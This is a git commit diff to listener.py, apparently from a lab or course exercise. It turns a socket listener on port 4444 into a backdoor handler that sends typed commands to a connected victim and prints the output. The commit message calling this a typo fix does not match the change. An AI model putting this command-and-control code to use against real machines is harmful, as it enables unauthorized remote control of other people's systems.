4c8c027b2cd1fb09479f4969bd17bd1d533c9571
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-10-10 17:03:26 -0400

    Fixin some typos

--- listener.py
+++ listener.py
@@ -7,5 +7,11 @@ listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 listener.bind(("10.0.2.15", 4444))
 listener.listen(0)
 print("[+] Waiting for connection.\n")
-listener.accept()
-print("\n[+] Got a connection.\n")
+connection, address = listener.accept()
+print("\n[+] Got a connection from " + str(address))
+
+while True:
+    command = raw_input(">> ")
+    connection.send(command)
+    result = connection.recv(1024)
+    print(result)
